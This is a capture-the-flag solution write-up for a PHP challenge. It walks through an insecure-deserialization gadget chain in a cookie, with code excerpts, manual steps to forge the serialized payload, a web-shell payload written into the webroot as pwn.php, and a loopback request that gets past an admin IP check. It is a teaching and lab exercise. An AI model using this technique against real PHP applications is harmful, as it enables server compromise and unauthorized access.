# Rubber Stamp — Solution

## The bug

`public/bootstrap.php` - included by both routes, "My Forms" (`index.php`) and "Submit a
Form" (`submit.php`) - keeps a terminal's whole form list client-side: there's no
database, so the list is just `base64(serialize($forms))` in the `forms` cookie, read
back and `unserialize()`'d on every request to either page. The only check afterward is
`is_array($decoded)` on the outer value - nothing validates what's actually inside that
array.

`unserialize()` never calls a class's constructor - it populates properties directly -
so none of `Form::__construct()`'s or `ArchiveWriter::__construct()`'s logic runs on the
way in. Whatever shape of objects the cookie describes is what PHP builds, and by the
time `is_array()` even runs, every object inside has already been fully constructed.

## The chain

1. Every object in the unserialized `$forms` array gets torn down automatically when the
   script ends (the cookie is decoded on every page load, not just on submit).
   `Form::__destruct()` hands its `auditLog` property straight to
   `ArchiveWriter::write()` with no check on where that writer is pointed, and the log
   line is built straight out of `$this->fields` - an array whose shape varies per form
   type and is never validated:

   ```php
   public function __destruct()
   {
       if ($this->auditLog instanceof ArchiveWriter) {
           $summary = '';
           if (is_array($this->fields)) {
               foreach ($this->fields as $key => $value) {
                   $summary .= " {$key}={$value}";
               }
           }
           $this->auditLog->write(sprintf(
               '[form] form=%s type=%s%s',
               $this->formId, $this->formType, $summary
           ));
       }
   }
   ```

2. `ArchiveWriter::write()` appends its argument to `$this->archivePath` with no
   restriction on that path:

   ```php
   public function write(string $entry): void
   {
       file_put_contents($this->archivePath, $entry . PHP_EOL, FILE_APPEND);
   }
   ```

3. Pointing `archivePath` at a `.php` filename turns the write into a
   plantable web shell. Putting a `<?php ... ?>` payload anywhere in `Form::$fields` (or in `$formId`/
   `$formType`, which also get interpolated) is enough: PHP executes `<?php ?>` blocks
   wherever they appear in a file it's asked to run, regardless of the surrounding
   "[form] form=... type=..." text. It doesn't matter which form type or which field key
   carries it - every value in `$fields` ends up in the log line the same way.

4. `EmailNotifier` is a dead end some players will chase first - it also has a
   `__destruct()` that writes a file, and even has a `__wakeup()` "guard" on its
   `recipient` property, which makes it look like the intended gadget. But its write
   path is hardcoded to `/var/log/rubberstamp/mail.log`, which isn't under the webroot at
   all, so there's no way to turn it into code execution. The guard is a red herring -
   the actual vulnerable class (`ArchiveWriter`) has no `__wakeup()` at all.

5. `admin.php` holds the actual flag ("Director Override"), but it checks
   `$_SERVER['REMOTE_ADDR']` and 403s anyone who isn't `127.0.0.1` - it's only meant to be
   reachable from RazerPowerCo's own ops network, not the open internet. That check can't
   tell the difference between "a request from inside this container" and "a request from
   the actual ops network," though - so the payload we plant doesn't echo `getenv('FLAG')`
   itself, it makes its own loopback request to `admin.php` and relays back whatever comes
   out: `file_get_contents("http://127.0.0.1/admin.php")`.

## Building the payload

Both classes only have `public` properties, so this is plain PHP object serialization
with no property-name mangling to work around. `solve.py` builds the payload with a
small serializer (rather than a hand-typed string) so the length prefixes can't drift
out of sync with the content - the same thing you'd get from instantiating the real
`ArchiveWriter`/`Form` classes from the leaked source and calling `serialize()` on an
array containing one.

## Full solve path by hand
1. Fill out any form so that the cookie gets saved.
2. Decode the base64 cookie to get the plain PHP serialized object.
3. Modify any one of the saved form's fields with:
    ```
    <?php echo file_get_contents("http://127.0.0.1/admin.php"); ?>
    ```
    while making sure to update the length of the field to match (62).
4. Update the ArchiveWriter's path to be `/var/www/html/pwn.php` (don't forget to update the field's length to be 21).
5. Turn the whole payload back into base64 and write it to the cookie.
6. Refresh, then go to `/pwn.php`.

## Automated Solver

```
python3 solve.py http://<host>:<port>
```

This sets the forged `forms` cookie, requests `/` (either route fires the chain via
`bootstrap.php`; the script hits "My Forms" and plants `pwn.php` straight in the
webroot), then requests that file directly - which in turn makes its own request to
`admin.php` and hands back the Director Override page - and prints the flag found in it.
